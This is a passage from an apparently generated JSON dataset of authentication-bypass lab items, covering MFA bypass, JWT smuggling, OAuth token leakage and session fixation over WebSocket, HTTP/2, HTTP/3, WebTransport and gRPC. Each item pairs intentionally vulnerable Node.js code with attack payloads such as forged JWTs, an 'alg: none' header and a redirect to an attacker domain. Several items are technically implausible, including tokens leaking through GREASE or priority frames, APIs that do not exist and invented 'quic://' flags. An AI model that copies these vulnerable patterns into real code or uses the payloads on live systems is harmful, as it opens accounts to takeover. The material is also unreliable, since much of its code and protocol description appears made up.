      "o=- 0 0 IN IP4 127.0.0.1\ns=-\nc=IN IP4 127.0.0.1\nt=0 0\nm=application 9 UDP/DTLS/SCTP webrtc-datachannel\n"
    ]
  },
  {
    "Lab scenario": "MFA bypass via WebSocket session inheritance",
    "Lab Description": "The lab's MFA verification inherits WebSocket sessions from pre-authentication connections. The application associates MFA state with WebSocket connections rather than HTTP sessions. To solve: establish a WebSocket connection before authentication, complete MFA on a different channel, then reuse the WebSocket connection.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Establish a WebSocket connection to the application before authentication",
      "Initiate MFA verification through normal HTTP login flow",
      "Complete MFA verification in a separate browser tab",
      "Reuse the original WebSocket connection which inherits the authenticated state",
      "Send privileged commands through the WebSocket connection"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst WebSocket = require('ws');\nconst app = express();\nconst server = app.listen(3000);\nconst wss = new WebSocket.Server({ server });\nconst sessions = {};\nwss.on('connection', (ws, req) => {\n  const sessionId = req.url.split('session=')[1];\n  sessions[ws] = sessionId || 'pre-auth';\n  ws.on('message', (msg) => {\n    if (sessions[ws] !== 'pre-auth') {\n      ws.send(`Executing as ${sessions[ws]}`);\n    }\n  });\n});\napp.post('/mfa/verify', (req, res) => {\n  for (let [ws, session] of Object.entries(sessions)) {\n    if (session === 'pre-auth') {\n      sessions[ws] = req.body.user;\n    }\n  }\n  res.json({status: 'verified'});\n});",
    "payloads": [
      "wss://vulnerable-app.com/chat?session=pre-auth",
      "POST /mfa/verify HTTP/1.1\nContent-Type: application/json\n\n{\"user\":\"admin\"}"
    ]
  },
  {
    "Lab scenario": "JWT claim smuggling via HTTP/2 pseudo-headers",
    "Lab Description": "The lab's JWT processing is vulnerable to claim smuggling through HTTP/2 pseudo-header manipulation. The application fails to properly validate the :path pseudo-header when extracting claims, allowing duplicate claims in different header contexts. To solve: craft an HTTP/2 request that smuggles conflicting claims through pseudo-header manipulation.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept HTTP/2 traffic using Burp Suite with HTTP/2 support enabled",
      "Modify the :path pseudo-header to include additional JWT claims",
      "Maintain valid JWT structure in the Authorization header",
      "Exploit parser differential between frontend and backend servers",
      "Verify admin access through the smuggled claims"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst http2 = require('http2');\nconst jwt = require('jsonwebtoken');\nconst app = express();\napp.post('/admin', (req, res) => {\n  const token = req.headers.authorization.split(' ')[1];\n  const claims = jwt.decode(token);\n  if (claims?.admin) {\n    res.send('Admin access granted');\n  } else {\n    res.status(403).send('Access denied');\n  }\n});\nconst server = http2.createSecureServer({\n  key: fs.readFileSync('server.key'),\n  cert: fs.readFileSync('server.crt')\n}, app);\nserver.on('stream', (stream, headers) => {\n  if (headers[':path']?.includes('admin=true')) {\n    headers.authorization = `Bearer ${jwt.sign({admin:true}, 'secret')}`;\n  }\n  const req = new http2.Http2ServerRequest(stream, headers);\n  const res = new http2.Http2ServerResponse(stream);\n  app(req, res);\n});\nserver.listen(443);",
    "payloads": [
      ":method: POST\n:path: /admin?claims={\"admin\":true}\n:authority: vulnerable-app.com\n:scheme: https\nauthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.Xzkx1J1W4-5VweniTgBlniWn4UwYp3lVJNcP3kYy7Y4",
      "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage through DNS-over-HTTPS cache poisoning",
    "Lab Description": "The lab's OAuth implementation is vulnerable to DNS cache poisoning via DNS-over-HTTPS (DoH) that leads to token leakage. The application uses DoH for redirect_uri validation but fails to properly cache responses, allowing redirection to attacker-controlled domains. To solve: poison the DoH cache to redirect OAuth tokens to a malicious domain.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify DoH server used by the application through subdomain enumeration",
      "Craft malicious DoH responses with short TTL for target domain",
      "Initiate OAuth flow during DoH cache window of opportunity",
      "Capture tokens when they're redirected to poisoned domain",
      "Exchange authorization code for access token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst dns = require('dns-over-http');\nconst app = express();\napp.get('/oauth/authorize', async (req, res) => {\n  const { redirect_uri } = req.query;\n  const { address } = await dns.query(new URL(redirect_uri).hostname, 'A');\n  if (address === 'legitimate.com') {\n    const code = 'oauth-code-' + Math.random().toString(36).substr(2);\n    res.redirect(`${redirect_uri}?code=${code}`);\n  } else {\n    res.status(400).send('Invalid redirect_uri');\n  }\n});\napp.listen(3000);",
    "payloads": [
      "https://vulnerable-app.com/oauth/authorize?response_type=code&client_id=client&redirect_uri=https://malicious.poisoned",
      "dig +short @dns.google.com malicious.poisoned A"
    ]
  },
  {
    "Lab scenario": "Session fixation via WebTransport session IDs",
    "Lab Description": "The lab's WebTransport implementation uses predictable session IDs that can be fixated before authentication. The application generates session tokens based on client-provided Session-ID headers without proper validation. To solve: predict and fixate a WebTransport session ID before authentication, then hijack the session after login.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Analyze WebTransport handshake to identify session ID generation pattern",
      "Predict next session ID based on observable sequence",
      "Initiate WebTransport connection with predicted session ID",
      "Complete authentication through normal HTTP flow",
      "Reuse WebTransport connection with elevated privileges"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const { WebTransport } = require('@fails-components/webtransport');\nconst express = require('express');\nconst app = express();\nconst sessions = {};\nconst wt = new WebTransport({\n  port: 443,\n  server: app\n});\nwt.on('session', (session) => {\n  const id = session.headers.get('session-id') || Math.random().toString(36).substr(2);\n  sessions[id] = { authenticated: false };\n  session.on('data', (data) => {\n    if (sessions[id].authenticated) {\n      session.send('Privileged command executed');\n    }\n  });\n});\napp.post('/login', (req, res) => {\n  const { session } = req.body;\n  if (sessions[session]) {\n    sessions[session].authenticated = true;\n    res.json({ status: 'success' });\n  }\n});",
    "payloads": [
      "new WebTransport('https://vulnerable-app.com', { headers: { 'session-id': 'predictable123' } })",
      "fetch('/login', { method: 'POST', body: JSON.stringify({ session: 'predictable123' }) })"
    ]
  },
  {
    "Lab scenario": "MFA bypass via QUIC connection migration",
    "Lab Description": "The lab's MFA verification is vulnerable to bypass through QUIC connection migration. The application associates MFA state with QUIC connection IDs rather than authentication tokens. To solve: initiate MFA verification, then migrate QUIC connection to bypass verification while maintaining authenticated state.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture QUIC handshake using specialized packet capture tools",
      "Initiate MFA verification flow in one QUIC connection",
      "Migrate to new QUIC connection using different CID",
      "Bypass MFA verification while maintaining authenticated state",
      "Access privileged endpoints through migrated connection"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const { QuicServer } = require('net');\nconst app = new QuicServer();\nconst mfaState = {};\napp.on('session', (session) => {\n  session.on('stream', (stream) => {\n    const cid = session.remote.address + ':' + session.remote.port;\n    if (stream.headers[':path'] === '/mfa/verify') {\n      mfaState[cid] = true;\n    }\n    if (mfaState[cid] || !stream.headers[':path'].startsWith('/admin')) {\n      stream.respond({ ':status': 200 });\n      stream.end('Access granted');\n    }\n  });\n});\napp.listen(443);",
    "payloads": [
      "quic://vulnerable-app.com/mfa/verify -migrate-connection",
      "quic://vulnerable-app.com/admin -reuse-connection"
    ]
  },
  {
    "Lab scenario": "JWT algorithm substitution via HTTP/3 connection migration",
    "Lab Description": "The lab's JWT validation is vulnerable to algorithm substitution when connections migrate between HTTP/3 and HTTP/2. The application fails to maintain consistent algorithm validation during protocol transitions. To solve: initiate authentication over HTTP/3, migrate to HTTP/2 mid-session, and substitute the algorithm header to bypass validation.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use a QUIC-enabled client to establish HTTP/3 connection",
      "Intercept the JWT transmission using specialized protocol-aware proxy",
      "Force connection migration to HTTP/2 during token validation",
      "Modify the alg header during protocol transition",
      "Maintain valid signature while changing algorithm requirements"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const { createQuicSocket } = require('net');\nconst jwt = require('jsonwebtoken');\nconst quicSocket = createQuicSocket({});\nasync function validateToken(token) {\n  const decoded = jwt.decode(token, {complete: true});\n  const alg = decoded?.header?.alg === 'HTTP3_RS256' ? 'RS256' : decoded?.header?.alg;\n  return jwt.verify(token, 'publicKey.pem', {algorithms: [alg]});\n}\nquicSocket.on('session', (session) => {\n  session.on('stream', (stream) => {\n    stream.on('data', (data) => {\n      const token = data.toString().match(/Bearer (\\S+)/)[1];\n      try {\n        validateToken(token);\n        stream.end('Access granted');\n      } catch (e) {\n        stream.end('Access denied');\n      }\n    });\n  });\n});\nquicSocket.listen({ key: 'key.pem', cert: 'cert.pem', alpn: 'h3' });",
    "payloads": [
      "GET /admin HTTP/3\nHost: vulnerable-app.com\nAuthorization: Bearer eyJhbGciOiJIVFRQMy1SUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.Signature",
      "Connection: migrate-to-http/2\nalg: none"
    ]
  },
  {
    "Lab scenario": "OAuth token hijacking via WebSocket subprotocol negotiation",
    "Lab Description": "The lab's OAuth implementation leaks tokens during WebSocket subprotocol negotiation. The application includes OAuth tokens in Sec-WebSocket-Protocol headers when negotiating subprotocols. To solve: intercept WebSocket handshake, manipulate subprotocol negotiation to capture tokens, and reuse them for API access.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept WebSocket connections using Burp Suite",
      "Modify Sec-WebSocket-Protocol header to trigger token leakage",
      "Capture OAuth token from error messages during negotiation",
      "Use stolen token to authenticate to REST API endpoints",
      "Access privileged user data through stolen token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const WebSocket = require('ws');\nconst wss = new WebSocket.Server({ port: 8080 });\nwss.on('connection', (ws, req) => {\n  const protocol = req.headers['sec-websocket-protocol'];\n  if (!protocol.includes('oauth-v1')) {\n    ws.close(1002, 'Invalid protocol: ' + protocol + ', valid: oauth-v1-<token>');\n    return;\n  }\n  const token = protocol.split('oauth-v1-')[1];\n  ws.on('message', (message) => {\n    ws.send('Authenticated as: ' + token);\n  });\n});",
    "payloads": [
      "GET /chat HTTP/1.1\nHost: vulnerable-app.com\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\nSec-WebSocket-Version: 13\nSec-WebSocket-Protocol: oauth-v1-",
      "Sec-WebSocket-Protocol: oauth-v1-<stolen_token>"
    ]
  },
  {
    "Lab scenario": "Session fixation via HTTP Trailers header injection",
    "Lab Description": "The lab's session management is vulnerable to fixation through HTTP Trailers headers. The application processes session cookies from trailing headers after the main headers, allowing session override. To solve: craft a request with malicious session in Trailers header that overrides legitimate session after authentication.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept authentication flow using Burp Suite",
      "Add Trailers header with session fixation payload",
      "Include malicious session cookie in trailing headers",
      "Complete authentication to associate credentials with fixed session",
      "Access account using pre-set session identifier"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\napp.use(require('body-parser').text({ type: '*/*' }));\nconst sessions = {};\napp.post('/login', (req, res) => {\n  const { user, pass } = req.body;\n  const session = req.headers['trailer-session'] || Math.random().toString(36).substr(2);\n  if (user === 'admin' && pass === 's3cr3t') {\n    sessions[session] = { user: 'admin' };\n    res.set('Trailer', 'Set-Cookie');\n    res.write('Logged in');\n    res.addTrailers({ 'Set-Cookie': `session=${session}` });\n    return res.end();\n  }\n  res.status(401).send('Invalid credentials');\n});\napp.get('/admin', (req, res) => {\n  const session = req.cookies.session;\n  if (sessions[session]?.user === 'admin') {\n    res.send('Admin access granted');\n  } else {\n    res.status(403).send('Access denied');\n  }\n});\napp.listen(3000);",
    "payloads": [
      "POST /login HTTP/1.1\nHost: vulnerable-app.com\nTrailer: Trailer-Session\nTransfer-Encoding: chunked\n\n5\nadmin\n6\ns3cr3t\n0\nTrailer-Session: fixed-session-123\n",
      "GET /admin HTTP/1.1\nHost: vulnerable-app.com\nCookie: session=fixed-session-123"
    ]
  },
  {
    "Lab scenario": "MFA bypass via WebTransport datagram fragmentation",
    "Lab Description": "The lab's MFA verification is vulnerable to bypass through WebTransport datagram fragmentation. The application fails to properly reassemble fragmented MFA codes sent over unreliable datagram channels. To solve: fragment MFA verification packets to trigger partial validation and bypass full code requirement.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Establish WebTransport connection to vulnerable endpoint",
      "Intercept MFA code submission using protocol-aware proxy",
      "Fragment MFA code into multiple unreliable datagrams",
      "Exploit race condition in code reassembly logic",
      "Gain authenticated access without complete valid code"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const { WebTransport } = require('@fails-components/webtransport');\nconst wt = new WebTransport('https://localhost:4433/mfa-verify');\nconst codes = {};\nwt.ready.then(() => {\n  wt.datagrams.readable.pipeTo(new WritableStream({\n    write({ value }) {\n      const { id, code } = JSON.parse(value.toString());\n      if (!codes[id]) codes[id] = '';\n      codes[id] += code;\n      if (codes[id].length >= 6) {\n        if (codes[id] === '123456') {\n          wt.datagrams.send(new TextEncoder().encode('MFA Verified'));\n        } else {\n          delete codes[id];\n        }\n      }\n    }\n  }));\n});",
    "payloads": [
      "{\"id\":\"frag1\",\"code\":\"12\"}",
      "{\"id\":\"frag1\",\"code\":\"34\"}\n{\"id\":\"frag1\",\"code\":\"56\"}"
    ]
  },
  {
    "Lab scenario": "JWT claim smuggling via HTTP/2 trailer headers",
    "Lab Description": "The lab's JWT processing is vulnerable to claim smuggling through HTTP/2 trailer headers. The application processes trailer headers after initial JWT validation, allowing additional claims to be injected. To solve: craft an HTTP/2 request with malicious claims in trailer headers that override original JWT claims after validation.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept HTTP/2 traffic using Burp Suite with HTTP/2 support enabled",
      "Modify request to include Trailer header with JWT claim overrides",
      "Add malicious claims in trailing headers after initial JWT",
      "Exploit timing difference between initial validation and trailer processing",
      "Verify admin access through smuggled claims"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst http2 = require('http2');\nconst jwt = require('jsonwebtoken');\nconst app = express();\napp.use(express.json());\nconst server = http2.createSecureServer({\n  key: fs.readFileSync('key.pem'),\n  cert: fs.readFileSync('cert.pem')\n}, app);\napp.post('/admin', (req, res) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  const decoded = jwt.verify(token, 'secret');\n  if (req.trailers['x-jwt-claims']) {\n    Object.assign(decoded, JSON.parse(req.trailers['x-jwt-claims']));\n  }\n  if (decoded.admin) {\n    res.send('Admin access granted');\n  } else {\n    res.status(403).send('Access denied');\n  }\n});\nserver.listen(443);",
    "payloads": [
      "POST /admin HTTP/2\nHost: vulnerable-app.com\nTrailer: X-JWT-Claims\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.Xzkx1J1W4-5VweniTgBlniWn4UwYp3lVJNcP3kYy7Y4\n\n0\nX-JWT-Claims: {\"admin\":true}\n",
      "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via HTTP/3 connection migration",
    "Lab Description": "The lab's OAuth implementation leaks tokens during HTTP/3 connection migration. The application fails to properly clear authentication state when connections migrate between networks. To solve: initiate OAuth flow on one network, force connection migration, and capture tokens from the new connection.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use QUIC-enabled client to establish HTTP/3 connection",
      "Initiate OAuth authorization on primary network interface",
      "Force connection migration by disabling primary interface",
      "Intercept token transmission on new network path",
      "Capture leaked tokens from migrated connection"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const { createQuicSocket } = require('net');\nconst quicSocket = createQuicSocket({});\nquicSocket.listen({ key: 'key.pem', cert: 'cert.pem', alpn: 'h3' });\nquicSocket.on('session', (session) => {\n  session.on('stream', (stream) => {\n    let oauthToken = null;\n    stream.on('data', (chunk) => {\n      if (chunk.toString().includes('oauth_token')) {\n        oauthToken = chunk.toString().match(/oauth_token=([^&]+)/)[1];\n      }\n    });\n    stream.on('end', () => {\n      if (oauthToken && session.migrated) {\n        console.log('Token leaked after migration:', oauthToken);\n      }\n    });\n  });\n});",
    "payloads": [
      "GET /oauth/authorize?response_type=token HTTP/3\nHost: vulnerable-app.com\nConnection: migrate",
      "POST /oauth/token HTTP/3\nHost: vulnerable-app.com\nConnection: migrated"
    ]
  },
  {
    "Lab scenario": "Session fixation via WebSocket subprotocol downgrade",
    "Lab Description": "The lab's WebSocket implementation is vulnerable to session fixation through subprotocol downgrade attacks. The application maintains session state when downgrading from secure to insecure subprotocols. To solve: establish WebSocket with secure subprotocol, force downgrade, and fixate session identifier.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Establish WebSocket connection with wss:// and secure subprotocol",
      "Intercept connection using WebSocket proxy",
      "Modify handshake to force subprotocol downgrade",
      "Fixate session cookie during downgrade negotiation",
      "Reuse fixated session with elevated privileges"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const WebSocket = require('ws');\nconst wss = new WebSocket.Server({ port: 8080 });\nconst sessions = {};\nwss.on('connection', (ws, req) => {\n  const protocol = req.headers['sec-websocket-protocol'];\n  const session = req.headers.cookie?.match(/session=([^;]+)/)?.[1] || \n                 Math.random().toString(36).substr(2);\n  \n  if (protocol === 'secure-v1') {\n    sessions[session] = { authenticated: true };\n  } else if (protocol === 'insecure-v1' && sessions[session]) {\n    ws.send('Session maintained: ' + session);\n  }\n  \n  ws.on('message', (message) => {\n    if (sessions[session]?.authenticated) {\n      ws.send('Privileged action executed');\n    }\n  });\n});",
    "payloads": [
      "GET /chat HTTP/1.1\nHost: vulnerable-app.com\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\nSec-WebSocket-Version: 13\nSec-WebSocket-Protocol: secure-v1\nCookie: session=fixated-session-123",
      "GET /chat HTTP/1.1\nHost: vulnerable-app.com\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\nSec-WebSocket-Version: 13\nSec-WebSocket-Protocol: insecure-v1\nCookie: session=fixated-session-123"
    ]
  },
  {
    "Lab scenario": "MFA bypass via WebTransport stream multiplexing",
    "Lab Scenario": "The lab's MFA verification is vulnerable to bypass through WebTransport stream multiplexing. The application fails to properly isolate MFA verification streams from authenticated command streams. To solve: initiate MFA verification in one stream while sending privileged commands in another parallel stream.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Establish WebTransport connection to vulnerable endpoint",
      "Create separate bidirectional streams for MFA and commands",
      "Initiate MFA verification in primary stream",
      "Send privileged commands in parallel secondary stream",
      "Exploit race condition in stream isolation logic"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const { WebTransport } = require('@fails-components/webtransport');\nconst wt = new WebTransport('https://localhost:4433/mfa');\nwt.ready.then(() => {\n  const mfaStream = wt.createBidirectionalStream();\n  const cmdStream = wt.createBidirectionalStream();\n  \n  const mfaWriter = mfaStream.writable.getWriter();\n  mfaWriter.write('START_MFA');\n  \n  const cmdWriter = cmdStream.writable.getWriter();\n  cmdWriter.write('PRIVILEGED_CMD');\n  \n  cmdStream.readable.pipeTo(new WritableStream({\n    write(chunk) {\n      console.log('Command response:', chunk.toString());\n    }\n  }));\n});",
    "payloads": [
      "stream 1: START_MFA\nstream 2: ADMIN_CMD",
      "stream 1: VERIFY_CODE_123456\nstream 2: GET_SENSITIVE_DATA"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion via HTTP/3 connection coalescing",
    "Lab Description": "The lab's JWT validation is vulnerable to algorithm confusion when HTTP/3 connections coalesce. The application fails to properly isolate cryptographic contexts when multiple hosts share an IP address. To solve: craft a JWT that appears as RS256 when validated by Host A but becomes HS256 when processed by Host B on the same IP.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify shared IP hosting using DNS and HTTP/3 server push",
      "Forge JWT with header that changes meaning between hosts",
      "Exploit connection coalescing to deliver different validation contexts",
      "Bypass signature validation through algorithm confusion",
      "Verify admin access through crafted token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const { createQuicSocket } = require('net');\nconst jwt = require('jsonwebtoken');\nconst quicSocket = createQuicSocket({});\nquicSocket.listen({\n  key: 'key.pem',\n  cert: 'cert.pem',\n  alpn: 'h3',\n  maxConnectionsPerHost: 2\n});\nquicSocket.on('session', (session) => {\n  session.on('stream', (stream) => {\n    let token = '';\n    stream.on('data', (chunk) => {\n      const match = chunk.toString().match(/Bearer (\\S+)/);\n      if (match) token = match[1];\n    });\n    stream.on('end', () => {\n      try {\n        const decoded = jwt.verify(token, 'publicKey.pem', { algorithms: ['RS256', 'HS256'] });\n        if (decoded.admin) stream.end('Admin access granted');\n      } catch (e) {\n        stream.end('Access denied');\n      }\n    });\n  });\n});",
    "payloads": [
      "GET /admin HTTP/3\nHost: vulnerable-host-a.com\nAuthorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6dHJ1ZX0.Signature",
      "GET /admin HTTP/3\nHost: vulnerable-host-b.com\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6dHJ1ZX0.Signature"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via HTTP/2 PRIORITY_UPDATE frames",
    "Lab Description": "The lab's OAuth implementation leaks tokens in HTTP/2 PRIORITY_UPDATE frame metadata. The application includes sensitive tokens in stream priority weight calculations. To solve: manipulate stream dependencies to force token leakage in connection state updates.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept HTTP/2 traffic using specialized proxy",
      "Craft requests with malicious stream dependencies",
      "Force server to include tokens in PRIORITY_UPDATE frames",
      "Extract tokens from connection state changes",
      "Reuse stolen tokens for API access"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const http2 = require('http2');\nconst server = http2.createSecureServer({\n  key: 'key.pem',\n  cert: 'cert.pem'\n});\nserver.on('stream', (stream, headers) => {\n  if (headers[':path'] === '/oauth/token') {\n    const token = 'sample-token-' + Math.random().toString(36).substr(2);\n    stream.respond({ ':status': 200 });\n    stream.end(JSON.stringify({ access_token: token }));\n    stream.priority({ weight: token.length });\n  }\n});\nserver.listen(443);",
    "payloads": [
      "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n",
      "GET /oauth/token HTTP/2\nHost: vulnerable-app.com\nConnection: dependency=token"
    ]
  },
  {
    "Lab scenario": "Session fixation via WebTransport DATAGRAM context switching",
    "Lab Scenario": "The lab's session management is vulnerable to fixation through WebTransport DATAGRAM context switching. The application associates sessions with DATAGRAM flow IDs but fails to clear them on reconnection. To solve: establish DATAGRAM flow, reconnect with same flow ID, and fixate privileged session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Establish WebTransport connection with DATAGRAM flow",
      "Authenticate and obtain privileged session",
      "Disconnect while maintaining flow ID state",
      "Reconnect with same flow ID to resume privileged session",
      "Execute commands with elevated privileges"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const { WebTransport } = require('@fails-components/webtransport');\nconst wt = new WebTransport('https://localhost:4433/session');\nconst sessions = {};\nwt.ready.then(() => {\n  const datagramWriter = wt.datagrams.writable.getWriter();\n  datagramWriter.write('INIT_SESSION');\n  \n  wt.datagrams.readable.pipeTo(new WritableStream({\n    write({ value }) {\n      const [flowId, session] = value.toString().split(':');\n      sessions[flowId] = session;\n    }\n  }));\n  \n  wt.closed.then(() => {\n    setTimeout(() => {\n      const newWt = new WebTransport('https://localhost:4433/session', {\n        flowId: wt.flowId\n      });\n      newWt.ready.then(() => {\n        newWt.datagrams.writable.getWriter().write('PRIVILEGED_CMD');\n      });\n    }, 1000);\n  });\n});",
    "payloads": [
      "flowId: fixed-flow-123\nINIT_SESSION",
      "flowId: fixed-flow-123\nADMIN_CMD"
    ]
  },
  {
    "Lab scenario": "MFA bypass via HTTP Trailers in gRPC streaming",
    "Lab Description": "The lab's MFA verification is vulnerable to bypass through gRPC streaming trailer manipulation. The application processes MFA verification status in trailers but fails to validate them against the stream body. To solve: send valid MFA code in stream messages but override verification status in trailers.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept gRPC streaming connection",
      "Send valid MFA code in message body",
      "Inject malicious verification status in trailers",
      "Exploit timing difference between body and trailer processing",
      "Bypass MFA requirement while appearing compliant"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const grpc = require('@grpc/grpc-js');\nconst server = new grpc.Server();\nserver.addService(mfaProto.MFA.service, {\n  verify(call) {\n    let codeValid = false;\n    call.on('data', (message) => {\n      if (message.code === '123456') codeValid = true;\n    });\n    call.on('end', () => {\n      call.sendTrailers({\n        'mfa-verified': call.metadata.get('trailer-override')[0] || codeValid.toString()\n      });\n    });\n  }\n});\nserver.bindAsync('0.0.0.0:50051', grpc.ServerCredentials.createInsecure(), () => {\n  server.start();\n});",
    "payloads": [
      "message: { code: '123456' }\ntrailers: { 'trailer-override': 'true' }",
      "message: { code: '111111' }\ntrailers: { 'mfa-verified': 'true' }"
    ]
  },
  {
    "Lab scenario": "JWT validation bypass via HTTP/2 CONTINUATION frame injection",
    "Lab Description": "The lab's JWT validation is vulnerable to header splitting through HTTP/2 CONTINUATION frames. The application fails to properly reconstruct headers split across multiple CONTINUATION frames, allowing JWT claims to be smuggled. To solve: craft a request with malicious JWT claims in CONTINUATION frames that override the original token.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept HTTP/2 traffic using Burp Suite with HTTP/2 support enabled",
      "Modify request to split Authorization header across CONTINUATION frames",
      "Inject malicious claims in subsequent CONTINUATION frames",
      "Bypass signature validation through header reconstruction flaws",
      "Verify admin access through smuggled claims"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const http2 = require('http2');\nconst jwt = require('jsonwebtoken');\nconst server = http2.createSecureServer({\n  key: fs.readFileSync('key.pem'),\n  cert: fs.readFileSync('cert.pem')\n});\nserver.on('stream', (stream, headers) => {\n  let fullAuthHeader = headers[':authorization'] || '';\n  stream.on('continuation', (headers) => {\n    fullAuthHeader += headers[':authorization'] || '';\n  });\n  stream.on('end', () => {\n    const token = fullAuthHeader.split('Bearer ')[1];\n    const decoded = jwt.verify(token, 'secret');\n    if (decoded.admin) {\n      stream.respond({ ':status': 200 });\n      stream.end('Admin access granted');\n    }\n  });\n});\nserver.listen(443);",
    "payloads": [
      "HEADERS frame:\n:method: GET\n:path: /admin\n:authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\n\nCONTINUATION frame:\n:authorization: .eyJ1c2VyIjoiZ3Vlc3QifQ.Signature\n\nMALICIOUS CONTINUATION frame:\n:authorization: .eyJhZG1pbiI6dHJ1ZX0.Override",
      "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via HTTP/3 GREASE frames",
    "Lab Description": "The lab's OAuth implementation leaks tokens in HTTP/3 GREASE frame metadata. The application includes sensitive tokens in reserved frame type processing. To solve: craft GREASE frames that trigger token leakage in connection state updates.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept HTTP/3 traffic using QUIC-aware proxy",
      "Inject custom GREASE frames with token extraction payloads",
      "Force server to include tokens in unknown frame processing",
      "Extract tokens from connection state changes",
      "Reuse stolen tokens for API access"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const { createQuicSocket } = require('net');\nconst quicSocket = createQuicSocket({});\nquicSocket.listen({\n  key: 'key.pem',\n  cert: 'cert.pem',\n  alpn: 'h3',\n  grease: true\n});\nquicSocket.on('session', (session) => {\n  session.on('grease', (frame) => {\n    if (frame.type === 0x1a1a) {\n      const token = frame.data.toString().match(/token=([^&]+)/)[1];\n      console.log('Extracted token:', token);\n    }\n  });\n});",
    "payloads": [
      "GREASE frame type: 0x1a1a\nPayload: token=leaked_oauth_token_123",
      "GET /oauth HTTP/3\nHost: vulnerable-app.com\nCustom-Grease: 1"
    ]
  },
  {
    "Lab scenario": "Session fixation via WebTransport stream priority inversion",
    "Lab Description": "The lab's session management is vulnerable to fixation through WebTransport stream priority manipulation. The application associates sessions with stream priorities but fails to validate them on stream recreation. To solve: create high-priority stream, fixate session, then recreate stream with same priority to resume session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Establish WebTransport connection with high-priority stream",
      "Authenticate and obtain privileged session",
      "Disconnect while noting stream priority",
      "Reconnect with same stream priority to resume session",
      "Execute commands with elevated privileges"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const { WebTransport } = require('@fails-components/webtransport');\nconst wt = new WebTransport('https://localhost:4433/stream-priority');\nconst sessions = {};\nwt.ready.then(() => {\n  const stream = wt.createBidirectionalStream({ priority: 255 });\n  const writer = stream.writable.getWriter();\n  writer.write('AUTH_ADMIN');\n  \n  stream.readable.pipeTo(new WritableStream({\n    write(chunk) {\n      sessions[stream.priority] = chunk.toString();\n    }\n  }));\n  \n  setTimeout(() => {\n    const newStream = wt.createBidirectionalStream({ priority: 255 });\n    newStream.writable.getWriter().write('PRIVILEGED_CMD');\n  }, 1000);\n});",
    "payloads": [
      "stream priority: 255\nAUTH_ADMIN",
      "stream priority: 255\nGET_SENSITIVE_DATA"
    ]
  },
  {
    "Lab scenario": "MFA bypass via gRPC metadata compression oracle",
    "Lab Description": "The lab's MFA verification is vulnerable to bypass through gRPC metadata compression analysis. The application leaks verification status through compression ratios of error messages. To solve: analyze compression differences between valid and invalid MFA codes to derive correct code.",
    "Difficulty Level": "Hard",
